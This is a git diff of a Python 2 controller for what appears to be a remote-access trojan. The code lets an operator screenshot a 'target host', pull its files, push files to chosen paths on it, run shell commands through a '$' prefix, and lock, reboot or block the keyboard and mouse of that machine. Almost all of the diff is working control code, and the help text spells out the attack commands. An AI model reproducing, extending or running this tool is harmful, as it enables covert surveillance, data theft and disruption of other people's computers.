@@ -24,10 +24,10 @@ def setup():
 
 # recv the client screenshot
 def recvFile(client_socket,type):
-    if (type == "png"):
-        if (os.path.isfile("screenshot.png")):
-            os.remove("screenshot.png")
-        f = open("screenshot.png","wb")
+    if (type == "jpg"):
+        if (os.path.isfile("screenshot.jpg")):
+            os.remove("screenshot.jpg")
+        f = open("screenshot.jpg","wb")
     else:
         file = "recvfile%s" % type
         f = open(file,"wb")
@@ -47,34 +47,27 @@ def recvFile(client_socket,type):
 
 # send the local File
 def sendFile(client_socket):
-    while(1):
-        filename = raw_input("File: ")
-        try:
-            f = open(filename,"rb")
-            break
-        except:
-            print "[-] Cann't find %s!" % filename
-            continue
+    filename = raw_input("File: ")
+    try:
+        f = open(filename,"rb")
+    except:
+        print "Open %s error!" % filename
 
     destPath = raw_input("To: ")
     client_socket.send(destPath)
-    check  = client_socket.recv(6)
 
-    if check[:5] == "BEGIN":
-        time.sleep(1)
-        while(1):
-            data = f.read(1024)
-            if not data:
-                break
-            client_socket.sendall(data)
-        f.close()
-        time.sleep(0.5)
-        client_socket.sendall("EOF")
-        stat = client_socket.recv(5)
-        if stat[:4] == "RECV":
-            print "[+] Send file successed!"
-    else:
-        print "[-] Remote path doesn't exist!"
+    time.sleep(1)
+    while(1):
+        data = f.read(512)
+        if not data:
+            break
+        client_socket.sendall(data)
+    f.close()
+    time.sleep(10)
+    client_socket.sendall("EOF")
+
+    print "Send file successed!"
+
 
 
 # this is our client-handling thread
@@ -88,29 +81,33 @@ def handle_client(client_socket):
     while(1):
 
         cmd = raw_input(">>> ")
-        client_socket.send(cmd)
-        if cmd == "screenshot":
-            recvFile(client_socket,"png")
-            continue
-
-        elif cmd == "download":
-            cmd = raw_input("File: ")
+        if len(cmd) > 0:
             client_socket.send(cmd)
-            recvFile(client_socket,cmd[-4:])
-            continue
-        elif cmd == "upload":
-            sendFile(client_socket)
-            continue
+            if cmd == "screenshot":
+                recvFile(client_socket,"jpg")
+                continue
 
-        elif cmd == "kill-client":
-            data = client_socket.recv(1024)
-            print "[-] %s" % data
-            break
+            elif cmd == "download":
+                cmd = raw_input("File: ")
+                client_socket.send(cmd)
+                recvFile(client_socket,cmd[-4:])
+                continue
+            elif cmd == "upload":
+                sendFile(client_socket)
+                continue
 
-        elif cmd[0] == "$":
-            data = client_socket.recv(1024)
-            print data.decode('gbk')
-            continue
+            elif cmd == "kill-client":
+                data = client_socket.recv(1024)
+                print "[-] %s" % data
+                break
+
+            elif cmd[0] == "$":
+                data = client_socket.recv(5120)
+                print data.decode('gbk')
+                continue
+            else:
+                continue
+
 
 # this is the help
 def help():
@@ -119,10 +116,7 @@ def help():
     print "\tshutdown      --shutdowm the target host after 10s."
     print "\treboot        --reboot the target host after 10s."
     print "\tcancel        --cancel shutdown or reboot."
-    print "\tkill-client   --kill the target client."
     print "\tscreenshot    --screenshot the target host."
-    print "\tdownload      --download the taeget's file. eg: C:\Users\\admin\\a.txt"
-    print "\tupload        --upload the local's file to the target. eg: File: 1.txt To:C:\\a.txt"
     print "\tlock          --lock the target host."
     print "\tmouse         --move the mouse the the location of (0,0)."
     print "\tblockinput    --lock the target's keyboard and mouse in 5s."
@@ -130,7 +124,7 @@ def help():
     print "\t@some message   --send a message to the target's desktop."
     print "Author: s0nnet"
     print "Email: s0nnet@qq.com"
-    print "Update: 2015/6/26"
+    print "Update: 2015/6/24"
     print "======================================================================"
     
 
